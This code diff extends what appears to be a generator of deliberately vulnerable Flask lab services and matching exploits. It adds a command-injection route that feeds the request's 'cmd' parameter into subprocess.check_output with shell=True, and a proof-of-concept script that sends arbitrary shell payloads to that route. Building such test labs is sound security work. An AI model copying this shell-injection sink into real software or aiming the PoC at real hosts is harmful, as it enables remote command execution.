@@ -270,6 +270,47 @@ def _open_redirect_poc_content(port: int) -> Dict[str, str]:
     return {"success_signature": success_signature, "flag_token": flag_token, "poc_content": poc_content}
 
 
+def _command_injection_poc_content(port: int) -> Dict[str, str]:
+    success_signature = "Exploit SUCCESS"
+    flag_token = "FLAG{CMDI_OK}"
+    poc_content = (
+        "import argparse\n"
+        "import sys\n"
+        "import requests\n\n"
+        f"SUCCESS_SIGNATURE = {success_signature!r}\n"
+        f"FLAG_TOKEN = {flag_token!r}\n"
+        "DEFAULT_PAYLOAD = 'echo FLAG{CMDI_OK}'\n\n"
+        "def exploit(base_url: str, payload: str) -> bool:\n"
+        "    url = base_url.rstrip('/') + '/run'\n"
+        "    try:\n"
+        "        resp = requests.get(url, params={'cmd': payload}, timeout=5)\n"
+        "        resp.raise_for_status()\n"
+        "    except requests.RequestException as exc:\n"
+        "        print(f'[cmdi-compiler] request failed: {exc}', file=sys.stderr)\n"
+        "        return False\n"
+        "    try:\n"
+        "        payload = resp.json()\n"
+        "    except ValueError:\n"
+        "        return False\n"
+        "    output = str(payload.get('output') or '')\n"
+        "    return str(payload.get('ok')) == 'True' and FLAG_TOKEN in output\n\n"
+        "def main() -> None:\n"
+        "    parser = argparse.ArgumentParser(description='Command Injection compiler PoC')\n"
+        f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
+        "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)\n"
+        "    args = parser.parse_args()\n"
+        "    if exploit(args.base_url, args.payload):\n"
+        "        print(SUCCESS_SIGNATURE)\n"
+        "        print(FLAG_TOKEN)\n"
+        "        raise SystemExit(0)\n"
+        "    print('[cmdi-compiler] exploit did not succeed', file=sys.stderr)\n"
+        "    raise SystemExit(1)\n\n"
+        "if __name__ == '__main__':\n"
+        "    main()\n"
+    )
+    return {"success_signature": success_signature, "flag_token": flag_token, "poc_content": poc_content}
+
+
 def _template_injection_poc_content(port: int) -> Dict[str, str]:
     success_signature = "Exploit SUCCESS"
     flag_token = "FLAG{SSTI_OK}"
@@ -393,6 +434,31 @@ FLASK_FRAGMENT_REGISTRY: Dict[str, FlaskFragmentSpec] = {
             "exploit_precondition": ("missing CSRF token validation",),
         },
         app_setup_block="app.secret_key = 'csrf-compiler-secret'\nBALANCES = {'victim': 1000, 'attacker': 0}",
+    ),
+    "command_injection_shell": FlaskFragmentSpec(
+        strategy="command_injection_shell",
+        family="command_injection",
+        fragment_id="shell_command_exec_route",
+        import_block="import subprocess\nfrom flask import Flask, jsonify, request",
+        route_block=(
+            "@app.get('/run')\n"
+            "def run_command():\n"
+            "    # Registry-backed compiler fragment: user-controlled cmd reaches subprocess.check_output(..., shell=True).\n"
+            "    cmd = request.args.get('cmd', 'echo safe')\n"
+            "    output = subprocess.check_output(cmd, shell=True, text=True)\n"
+            "    return jsonify({'ok': True, 'cmd': cmd, 'output': output})\n"
+        ),
+        poc_builder=_command_injection_poc_content,
+        pattern_tags=("compiler_generated", "command_injection"),
+        notes="Registry-backed compiler scaffold/fragment bundle for command injection.",
+        service_description="python/flask registry-backed command injection service.",
+        poc_description="Registry-backed command injection PoC.",
+        service_side_tokens=("subprocess.check_output", "shell=True", "request.args.get('cmd'"),
+        semantic_signature={
+            "input_vector": ("request.args", "command parameter"),
+            "sink": ("subprocess", "os.system", "shell=True"),
+            "exploit_precondition": ("command injection", "user input in command"),
+        },
     ),
     "open_redirect_reflect": FlaskFragmentSpec(
         strategy="open_redirect_reflect",
@@ -620,6 +686,8 @@ _EXACT_VULN_STRATEGIES = {
     "CWE_89": "sqli_string_concat",
     "CWE-352": "csrf_missing_token",
     "CWE_352": "csrf_missing_token",
+    "CWE-78": "command_injection_shell",
+    "CWE_78": "command_injection_shell",
     "CWE-22": "path_traversal_file_read",
     "CWE_22": "path_traversal_file_read",
     "CWE-79": "xss_reflected",
@@ -661,6 +729,8 @@ def resolve_fragment_strategy(vuln_id: str, pattern_id: str = "", raw_label: str
         return "ssrf_loopback_fetch"
     if "deserialization" in normalized_pattern or "insecure deserialization" in normalized_label:
         return "deserialization_pickle_body"
+    if "command-injection" in normalized_pattern or "command injection" in normalized_label:
+        return "command_injection_shell"
     if "sqli" in normalized_pattern or "sql injection" in normalized_label:
         return "sqli_string_concat"
     if "csrf" in normalized_pattern or "cross site request forgery" in normalized_label:
